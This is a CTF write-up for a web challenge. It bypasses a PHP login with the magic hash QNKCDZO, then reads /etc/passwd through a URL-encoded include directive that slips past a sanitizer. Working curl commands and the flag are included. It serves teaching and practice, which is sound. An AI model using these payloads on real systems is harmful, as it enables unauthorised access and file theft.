# Vibecode Meme Generator

> **Category:** Web · **Event:** KubSTU CTF 2026 Autumn · **Difficulty:** High

## 📌 Task

The page has a "Lab sign-in" form with a hint, leading to a Meme Studio. You have to bypass a PHP loose-comparison login (type juggling via a magic hash), then defeat the sanitizer of a legacy template-include directive to read a file off the server and recover the flag.

## 🏁 Solution

### 1. Lab sign-in

On the page there is a Lab sign-in form and a hint:

> The old login verifier compares results, not types. Inspect the request.

The player opens DevTools → Network and sees:

```http
POST /login.php
Content-Type: application/x-www-form-urlencoded
```

### 2. Type Juggling on login

Ordinary data gives `401 Unauthorized`.

The hint about types points to PHP loose comparison and a magic hash.

The known string:

```text
QNKCDZO
```

has the MD5:

```text
0e830400451993494058024219903391
```

The server indeed uses a PHP check:

```php
md5($password) == $hash
```

Therefore we send:

```text
username=admin&password=QNKCDZO
```

Via curl:

```bash
curl -i -c cookies.txt \
  -d 'username=admin&password=QNKCDZO' \
  http://localhost:8080/login.php
```

Response:

```http
302 Found
Location: /studio
Set-Cookie: capybara_session=admin; Path=/; HttpOnly
```

It is important to keep the cookie.

### 3. Meme Studio

After going to `/studio`, the player sees a form:

- Caption;
- Template;
- Render meme.

Hint:

> The renderer supports a legacy include directive. Input is cleaned before the template engine expands it. The two stages do not see exactly the same string.

The form submits:

```http
POST /render.php
Content-Type: application/x-www-form-urlencoded
```

### 4. Checking the filter

The ordinary `classic` template works.

If you send:

```text
[[include:/etc/passwd]]
```

the server responds `Unknown template`, because the sanitization removes:

```text
..
/
\\
etc
passwd
```

### 5. Bypassing the sanitization

The filtering is performed before URL decoding. Therefore we encode not only the slashes, but also the letters that the filter looks for literally:

```text
%5B%5Binclude:%2F%65%74%63%2F%70%61%73%73%77%64%5D%5D
```

After decoding this becomes:

```text
[[include:/etc/passwd]]
```

Command:

```bash
curl -i -b cookies.txt \
  -d 'caption=capybara&template=%5B%5Binclude:%2F%65%74%63%2F%70%61%73%73%77%64%5D%5D' \
  http://localhost:8080/render.php
```

The server returns `200 OK`, the contents of `/etc/passwd` and the flag:

```text
KubSTU{capybara_types_and_templates}
```

**Flag:** `KubSTU{capybara_types_and_templates}`
